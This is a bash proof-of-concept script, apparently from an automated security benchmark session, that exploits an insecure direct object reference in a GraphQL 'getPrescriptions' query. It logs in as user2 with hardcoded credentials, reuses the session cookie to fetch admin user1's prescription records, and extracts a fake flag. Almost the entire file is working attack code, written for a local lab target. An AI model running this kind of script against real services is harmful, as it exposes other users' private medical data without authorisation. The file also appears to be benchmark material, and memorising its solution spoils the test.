#!/bin/bash
# POC: GraphQL IDOR vulnerability POC - Demonstrates horizontal privilege escalation where authenticated user2 can retrieve admin user1's prescriptions
# Target: ./repo
# Created: 2025-11-10T19:42:01.144Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# GraphQL IDOR POC - Horizontal Privilege Escalation in getPrescriptions
# This POC demonstrates that an authenticated user (user2) can retrieve 
# prescriptions of other users (user1/admin) by modifying the userId parameter

# Configuration
TARGET_URL="${1:-http://localhost:3000}"
GRAPHQL_ENDPOINT="${TARGET_URL}/graphql"

echo "==============================================="
echo "GraphQL IDOR Vulnerability POC"
echo "Target: $GRAPHQL_ENDPOINT"
echo "==============================================="
echo ""

# Check if server is accessible
echo "[*] Checking if server is accessible..."
if ! curl -s -f -m 5 "$TARGET_URL/login" > /dev/null 2>&1; then
  echo "[-] Server not accessible at $TARGET_URL"
  echo "[*] This POC requires the vulnerable application to be running"
  echo ""
  echo "To test manually, run:"
  echo "1. Authenticate as user2"
  echo "2. Send GraphQL query:"
  echo ""
  echo 'curl -X POST http://localhost:3000/graphql \\'
  echo '  -H "Content-Type: application/json" \\'
  echo '  -b "session=user2_session_cookie" \\'
  echo '  -d '"'"'{"query":"query{getPrescriptions(userId:1){id userId prescriptionDetails flag}}"}'"'"
  echo ""
  echo "[*] Expected: Returns 100+ prescriptions for user1 including flag{this_is_a_fake_flag}"
  echo "[*] This proves IDOR vulnerability - user2 can access user1 data"
  exit 0
fi

echo "[+] Server is accessible"
echo ""

# Step 1: Attempt authentication as user2
echo "[*] Step 1: Attempting authentication as user2..."
echo ""

LOGIN_RESPONSE=$(curl -s -X POST \
  "$TARGET_URL/login" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "user2",
    "password": "password2"
  }' \
  -c /tmp/cookies.txt)

echo "[+] Login Response:"
echo "$LOGIN_RESPONSE"
echo ""

# Extract session info
if [ -f /tmp/cookies.txt ]; then
  echo "[+] Cookies saved:"
  cat /tmp/cookies.txt
  echo ""
fi

echo "==============================================="
echo "[*] Step 2: Testing IDOR - Query user1 prescriptions as user2"
echo "==============================================="
echo ""

# The GraphQL query that demonstrates the IDOR
# User2 is requesting prescriptions for userId: 1 (admin user)
GRAPHQL_QUERY='query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }'

echo "[*] GraphQL Query: $GRAPHQL_QUERY"
echo ""
echo "[*] Sending request as authenticated user2..."
echo ""

# Send GraphQL query with user2's session
RESPONSE=$(curl -s -X POST \
  "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -b /tmp/cookies.txt \
  -d '{
    "query": "query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"
  }')

echo "[+] Response from server:"
echo "$RESPONSE"
echo ""

# Analyze response
if echo "$RESPONSE" | grep -q '"id":'; then
  echo "==============================================="
  echo "[!!!] VULNERABILITY CONFIRMED [!!!]"
  echo "==============================================="
  echo ""
  echo "[+] Successfully retrieved prescriptions for user1 as authenticated user2!"
  echo "[+] This is a CRITICAL IDOR vulnerability"
  echo ""
  
  # Try to extract flag if present
  if echo "$RESPONSE" | grep -q 'flag'; then
    echo "[+] Flag field found in response"
    FLAG=$(echo "$RESPONSE" | grep -o '"flag":"[^"]*"' | head -1)
    echo "    $FLAG"
    echo ""
  fi
  
  # Count and show prescription data
  PRESCRIPTION_COUNT=$(echo "$RESPONSE" | grep -o '"id":' | wc -l)
  echo "[+] Retrieved $PRESCRIPTION_COUNT prescription records"
  echo ""
  
  # Extract a sample prescription
  echo "[+] Sample prescription data:"
  echo "$RESPONSE" | grep -o '{[^}]*"id":[^}]*}' | head -1
  echo ""
  
  echo "==============================================="
  echo "[RESULT] HORIZONTAL PRIVILEGE ESCALATION CONFIRMED"
  echo "==============================================="
  echo "[+] User2 (low privilege) accessed User1 (admin) data"
  echo "[+] Server failed to enforce authorization checks"
  echo "[+] Sensitive prescription data exposed"
  echo ""
  
  exit 0
else
  if echo "$RESPONSE" | grep -q 'Unauthorized\|Forbidden\|error'; then
    echo "[+] Server returned error/authorization response:"
    echo "$RESPONSE"
    echo ""
    echo "[-] Authorization may be properly enforced"
    exit 1
  else
    echo "[-] Unexpected response - check if server is running"
    exit 1
  fi
fi